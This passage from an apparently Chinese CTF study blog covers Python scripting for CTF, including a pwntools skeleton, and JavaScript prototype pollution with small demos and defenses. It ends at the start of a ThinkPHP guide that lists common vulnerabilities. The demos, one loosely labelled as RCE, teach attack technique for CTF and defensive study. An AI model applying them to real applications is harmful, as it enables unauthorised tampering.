class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>data = <span class="hljs-string">b&quot;password123&quot;</span><br>hash_md5 = hashlib.md5(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MD5:&quot;</span>, hash_md5)<br><br>hash_sha256 = hashlib.sha256(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SHA256:&quot;</span>, hash_sha256)<br></code></pre></td></tr></table></figure><h3 id="4-高级内容"><a href="#4-高级内容" class="headerlink" title="4. 高级内容"></a>4. 高级内容</h3><h4 id="4-1-多线程与多进程"><a href="#4-1-多线程与多进程" class="headerlink" title="4.1 多线程与多进程"></a>4.1 多线程与多进程</h4><p>当需要处理大量数据或并发任务时，多线程和多进程能显著提高效率。</p><p><strong>多线程</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span> is running&quot;</span>)<br><br>thread1 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;A&quot;</span>,))<br>thread2 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;B&quot;</span>,))<br>thread1.start()<br>thread2.start()<br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure><h4 id="4-2-网络与爬虫"><a href="#4-2-网络与爬虫" class="headerlink" title="4.2 网络与爬虫"></a>4.2 网络与爬虫</h4><p>CTF中的一些题目涉及网络爬虫，使用Python可以快速获取并分析网页内容。</p><p><strong>请求网页</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>response = requests.get(<span class="hljs-string">&#x27;http://example.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p><strong>解析HTML</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.title.text)<br></code></pre></td></tr></table></figure><h4 id="4-3-利用Python进行自动化脚本编写"><a href="#4-3-利用Python进行自动化脚本编写" class="headerlink" title="4.3 利用Python进行自动化脚本编写"></a>4.3 利用Python进行自动化脚本编写</h4><p>自动化是CTF比赛中的重要技能，Python强大的自动化能力可以帮助快速解决某些复杂题目。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动化发送请求</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://example.com/login&quot;</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;<br>response = requests.post(url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h3 id="5-CTF中的Python应用场景"><a href="#5-CTF中的Python应用场景" class="headerlink" title="5. CTF中的Python应用场景"></a>5. CTF中的Python应用场景</h3><h4 id="5-1-Exploit开发"><a href="#5-1-Exploit开发" class="headerlink" title="5.1 Exploit开发"></a>5.1 Exploit开发</h4><p>在一些CTF的pwn题目中，选手需要编写Python脚本与远程服务进行交互，以利用漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>conn = remote(<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-number">12345</span>)<br><br><span class="hljs-comment"># 发送数据</span><br>conn.sendline(<span class="hljs-string">b&#x27;payload&#x27;</span>)<br><br><span class="hljs-comment"># 接收响应</span><br>response = conn.recvline()<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure><h4 id="5-2-逆向与二进制分析"><a href="#5-2-逆向与二进制分析" class="headerlink" title="5.2 逆向与二进制分析"></a>5.2 逆向与二进制分析</h4><p>Python可以通过编写脚本来自动化逆向工程任务，解码加密数据或分析程序的输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对二进制数据进行解码</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;binaryfile&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    binary_data = f.read()<br><br><span class="hljs-comment"># 自定义分析逻辑</span><br>decoded_data = binary_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded_data)<br></code></pre></td></tr></table></figure><h4 id="5-3-复杂的算法题"><a href="#5-3-复杂的算法题" class="headerlink" title="5.3 复杂的算法题"></a>5.3 复杂的算法题</h4><p>CTF比赛中可能涉及复杂的数学、图论或密码学算法。Python内置了丰富的库来解决这些问题，如<code>sympy</code>用于符号计算、<code>numpy</code>用于矩阵计算等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><br>x = sympy.Symbol(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = sympy.Eq(x**<span class="hljs-number">2</span> + <span class="hljs-number">2</span>*x - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br>solution = sympy.solve(equation)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解:&quot;</span>, solution)<br></code></pre></td></tr></table></figure><p>！</p><h1 id="2-JavaScript-基础"><a href="#2-JavaScript-基础" class="headerlink" title="2. JavaScript 基础"></a><strong>2. JavaScript</strong> <strong>基础</strong></h1><hr><h2 id="目录-1"><a href="#目录-1" class="headerlink" title="目录"></a>目录</h2><ul><li><p><a href="#1-javascript%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1">1. JavaScript中的对象</a></p><ul><li><a href="#11-%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">1.1 对象基本概念</a></li><li><a href="#12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE">1.2 对象的属性访问</a></li></ul></li><li><p><a href="#2-javascript%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0">2. JavaScript中的函数</a></p><ul><li><a href="#21-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1 函数声明与表达式</a></li><li><a href="#22-%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">2.2 箭头函数</a></li><li><a href="#23-this-%E5%85%B3%E9%94%AE%E5%AD%97">2.3 <code>this</code> 关键字</a></li></ul></li><li><p><a href="#3-%E5%8E%9F%E5%9E%8B%E4%B8%8E%E7%BB%A7%E6%89%BF">3. 原型与继承</a></p><ul><li><a href="#31-__proto__-%E5%92%8C-%E5%8E%9F%E5%9E%8B%E9%93%BE">3.1 <code>__proto__</code> 和 原型链</a></li><li><a href="#32-constructor">3.2 <code>constructor</code></a></li></ul></li><li><p><a href="#4-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93prototype-pollution">4. 类型污染（Prototype Pollution）</a></p><ul><li><a href="#41-%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93">4.1 什么是类型污染？</a></li><li><a href="#42-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93%E7%9A%84%E5%8E%9F%E7%90%86">4.2 类型污染的原理</a></li></ul></li><li><p><a href="#5-__proto__-%E5%92%8C-constructor-%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9">5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</a></p><ul><li><a href="#51-__proto__-%E6%B3%A8%E5%85%A5">5.1 <code>__proto__</code> 注入</a></li><li><a href="#52-constructor-%E5%92%8C-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">5.2 <code>constructor</code> 和 RCE（远程代码执行）</a></li><li><a href="#53-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5.3 防御措施</a></li></ul></li></ul><h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a>1. JavaScript中的对象</h3><h4 id="1-1-对象基本概念"><a href="#1-1-对象基本概念" class="headerlink" title="1.1 对象基本概念"></a>1.1 对象基本概念</h4><p>JavaScript中的对象是键值对的集合，用于存储复杂的数据结构。可以通过以下几种方式创建对象：</p><ul><li><p><strong>对象字面量</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>构造函数创建对象</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">name</span>);  <span class="hljs-comment">// &quot;Alice&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="1-2-对象的属性访问"><a href="#1-2-对象的属性访问" class="headerlink" title="1.2 对象的属性访问"></a>1.2 对象的属性访问</h4><p>可以通过<strong>点记法</strong>或<strong>方括号记法</strong>来访问对象的属性：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 点记法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&quot;age&quot;</span>]);  <span class="hljs-comment">// 方括号记法</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-JavaScript中的函数"><a href="#2-JavaScript中的函数" class="headerlink" title="2. JavaScript中的函数"></a>2. JavaScript中的函数</h3><h4 id="2-1-函数声明与表达式"><a href="#2-1-函数声明与表达式" class="headerlink" title="2.1 函数声明与表达式"></a>2.1 函数声明与表达式</h4><p>JavaScript中的函数是第一类对象（First-Class Objects），可以作为变量的值、参数传递或返回值。</p><ul><li><p><strong>函数声明</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>函数表达式</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-2-箭头函数"><a href="#2-2-箭头函数" class="headerlink" title="2.2 箭头函数"></a>2.2 箭头函数</h4><p>箭头函数是简化的函数声明方式，尤其在处理回调和简短函数时非常有用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="2-3-this-关键字"><a href="#2-3-this-关键字" class="headerlink" title="2.3 this 关键字"></a>2.3 <code>this</code> 关键字</h4><p>在函数内部，<code>this</code>指向调用该函数的对象。在构造函数中，<code>this</code>指向新创建的实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>alice.<span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// &quot;Hello, I am Alice&quot;</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-原型与继承"><a href="#3-原型与继承" class="headerlink" title="3. 原型与继承"></a>3. 原型与继承</h3><p>JavaScript中的对象是通过原型链进行继承的。每个对象都有一个<strong>隐式原型</strong>（<code>[[Prototype]]</code>），可以通过<code>__proto__</code>属性来访问。</p><h4 id="3-1-proto-和-原型链"><a href="#3-1-proto-和-原型链" class="headerlink" title="3.1 __proto__ 和 原型链"></a>3.1 <code>__proto__</code> 和 原型链</h4><p><code>__proto__</code>是JavaScript中对象的原型。通过这个原型链，JavaScript能够在一个对象的祖先链中查找属性和方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> obj2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(obj);  <span class="hljs-comment">// 创建一个继承自obj的对象</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">key</span>);  <span class="hljs-comment">// 输出 &quot;value&quot;，因为它继承了obj的属性</span><br></code></pre></td></tr></table></figure><p>当访问<code>obj2</code>的<code>key</code>属性时，JavaScript首先在<code>obj2</code>自身查找，如果找不到，则沿着原型链查找<code>obj</code>的属性。</p><h4 id="3-2-constructor"><a href="#3-2-constructor" class="headerlink" title="3.2 constructor"></a>3.2 <code>constructor</code></h4><p><code>constructor</code>是每个对象的属性，指向构造该对象的函数。可以通过<code>constructor</code>创建新实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-类型污染（Prototype-Pollution）"><a href="#4-类型污染（Prototype-Pollution）" class="headerlink" title="4. 类型污染（Prototype Pollution）"></a>4. 类型污染（Prototype Pollution）</h3><h4 id="4-1-什么是类型污染？"><a href="#4-1-什么是类型污染？" class="headerlink" title="4.1 什么是类型污染？"></a>4.1 什么是类型污染？</h4><p>类型污染（Prototype Pollution）是一种安全漏洞，攻击者通过修改对象的原型（<code>__proto__</code>）来篡改JavaScript全局对象的行为，从而影响所有继承该原型的对象。这种攻击可以导致权限提升、代码注入等安全问题。</p><h4 id="4-2-类型污染的原理"><a href="#4-2-类型污染的原理" class="headerlink" title="4.2 类型污染的原理"></a>4.2 类型污染的原理</h4><p>因为所有对象通过原型链共享相同的原型，当攻击者篡改全局对象的<code>__proto__</code>时，所有基于该原型创建的对象都会继承被篡改的属性或方法。</p><p><strong>危险操作示例</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">polluted</span> = <span class="hljs-string">&quot;I am polluted!&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// &quot;I am polluted!&quot;</span><br></code></pre></td></tr></table></figure><p>在上例中，攻击者通过修改<code>obj</code>的原型，成功将新的属性<code>polluted</code>注入到了所有对象的原型中。现在，所有新创建的对象都会带有这个“污染”的属性。</p><h4 id="4-3-防御类型污染"><a href="#4-3-防御类型污染" class="headerlink" title="4.3 防御类型污染"></a>4.3 防御类型污染</h4><p>为了防御类型污染，应该避免允许用户直接访问或修改<code>__proto__</code>。如果可能，尽量使用<strong>深拷贝</strong>或者使用框架中的安全库来处理对象操作。</p><p><strong>防御方法</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 检查输入是否是直接的对象属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeSet</span>(<span class="hljs-params">obj, key, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">&#x27;__proto__&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;constructor&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;prototype&#x27;</span>) &#123;<br>    obj[key] = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="5-proto-和-constructor-的安全风险"><a href="#5-proto-和-constructor-的安全风险" class="headerlink" title="5. __proto__ 和 constructor 的安全风险"></a>5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</h3><h4 id="5-1-proto-注入"><a href="#5-1-proto-注入" class="headerlink" title="5.1 __proto__ 注入"></a>5.1 <code>__proto__</code> 注入</h4><p>当不安全地操作<code>__proto__</code>时，攻击者可以通过类型污染来引入恶意属性或方法，造成潜在的安全风险。</p><p><strong>示例：利用<code>__proto__</code>修改全局行为</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is hacked!&quot;</span>;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-title function_">toString</span>());  <span class="hljs-comment">// &quot;This is hacked!&quot;</span><br></code></pre></td></tr></table></figure><h4 id="5-2-constructor-和-RCE（远程代码执行）"><a href="#5-2-constructor-和-RCE（远程代码执行）" class="headerlink" title="5.2 constructor 和 RCE（远程代码执行）"></a>5.2 <code>constructor</code> 和 RCE（远程代码执行）</h4><p><code>constructor</code>也是一个容易被滥用的对象属性。如果攻击者能够控制<code>constructor</code>，可能会注入恶意代码导致RCE。</p><p><strong>危险操作示例</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(&quot;RCE via constructor!&quot;)&#x27;</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> x = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>);  <span class="hljs-comment">// 触发恶意代码执行</span><br></code></pre></td></tr></table></figure><h4 id="5-3-防御措施"><a href="#5-3-防御措施" class="headerlink" title="5.3 防御措施"></a>5.3 防御措施</h4><ul><li><strong>严格限制用户输入</strong>: 检查和过滤用户输入，防止直接操作<code>__proto__</code>或<code>constructor</code>。</li><li><strong>冻结对象原型</strong>: 使用<code>Object.freeze()</code>或<code>Object.seal()</code>来防止对象的原型被修改。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure></li><li><strong>使用安全的对象操作方法</strong>: 避免直接使用<code>__proto__</code>，改用<code>Object.create()</code>等安全的方式创建对象。</li></ul><hr><h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h3><p>JavaScript中的对象、函数、<code>__proto__</code>与<code>constructor</code>机制在CTF和Web安全中扮演着重要角色。CTF选手应当熟悉这些概念，特别是类型污染、原型链的攻击与防御技巧，以应对Web题中常见的安全挑战。</p><h4 id="关键点回顾："><a href="#关键点回顾：" class="headerlink" title="关键点回顾："></a>关键点回顾：</h4><ul><li><p>JavaScript中的对象和函数是基于原型链的，这为类型污染攻击提供了可能。</p></li><li><p><code>__proto__</code>是访问和修改对象原型的入口，容易被滥用。</p></li><li><p><code>constructor</code>不仅用于对象构造，还可能被滥用执行恶意代码。</p></li><li><p>防御类型污染的关键在于输入验证、冻结原型、以及使用安全的对象操作方法。</p></li></ul><h1 id="3-PHP-框架-ThinkPHP"><a href="#3-PHP-框架-ThinkPHP" class="headerlink" title="3. PHP 框架 - ThinkPHP"></a><strong>3. PHP</strong> <strong>框架 - ThinkPHP</strong></h1><h3 id="ThinkPHP-快速入门与完整指南"><a href="#ThinkPHP-快速入门与完整指南" class="headerlink" title="ThinkPHP 快速入门与完整指南"></a>ThinkPHP 快速入门与完整指南</h3><p>本指南将从项目的目录结构开始，涵盖从控制器、路由、数据库操作、视图渲染、表单验证、错误处理、日志记录等常见功能的使用，最后会介绍项目的部署与配置。</p><hr><h3 id="目录-2"><a href="#目录-2" class="headerlink" title="目录"></a>目录</h3><ol><li><p><a href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">目录结构</a></p></li><li><p><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">快速入门</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%99%A8">创建控制器</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E8%B7%AF%E7%94%B1">配置路由</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C">数据库操作</a></li></ul></li><li><p><a href="#%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93">配置数据库</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%9E%8B">创建模型</a></li></ul></li><li><p><a href="#%E8%A7%86%E5%9B%BE%E5%92%8C%E6%A8%A1%E6%9D%BF">视图和模板</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E8%A7%86%E5%9B%BE%E6%96%87%E4%BB%B6">创建视图文件</a></li><li><a href="#%E6%B8%B2%E6%9F%93%E8%A7%86%E5%9B%BE">渲染视图</a></li></ul></li><li><p><a href="#%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">表单验证</a></p><ul><li><a href="#%E5%88%9B%E5%BB%BA%E9%AA%8C%E8%AF%81%E5%99%A8">创建验证器</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E5%99%A8">使用验证器</a></li></ul></li><li><p><a href="#%E9%94%99%E8%AF%AF%E5%92%8C%E6%97%A5%E5%BF%97">错误和日志</a></p><ul><li><a href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">错误处理</a></li><li><a href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">日志记录</a></li></ul></li><li><p><a href="#%E9%83%A8%E7%BD%B2">部署</a></p><ul><li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">配置环境</a></li><li><a href="#%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8">配置 Web 服务器</a></li></ul></li><li><p><a href="#thinkphp-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">ThinkPHP 框架架构与基础概念</a></p><ul><li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">1. 路由机制</a></li></ul><p></p></li><li><p><a href="#thinkphp-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">ThinkPHP 常见的安全漏洞</a></p><ul><li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">1. SQL 注入漏洞</a>  </li><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">2. 路径遍历漏洞</a>   </li><li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">3. 远程代码执行（RCE）</a>  </li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">4. 反序列化漏洞</a></li></ul></li><li><p><a 